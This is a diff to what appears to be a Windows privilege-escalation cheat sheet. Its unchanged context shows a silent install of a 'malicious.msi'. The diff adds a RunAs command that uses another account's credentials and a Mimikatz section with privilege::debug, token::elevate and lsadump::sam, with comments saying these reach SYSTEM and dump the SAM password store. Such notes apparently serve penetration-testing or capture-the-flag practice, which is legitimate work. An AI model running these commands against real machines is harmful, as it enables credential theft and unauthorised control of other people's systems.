@@ -71,7 +71,14 @@ msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
 ```cmd
 sc qc apphostsvc
 ```
-## Change-Powershell-User-with-admin ✅
+## Strart-Powershell-With-Admin ✅
 ```powershell
 Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+```
+
+## Mimikatz-Command ✅
+```powershell
+privilege::debug # this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
+token::elevate # simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges
+lsadump::sam # list of password
 ```
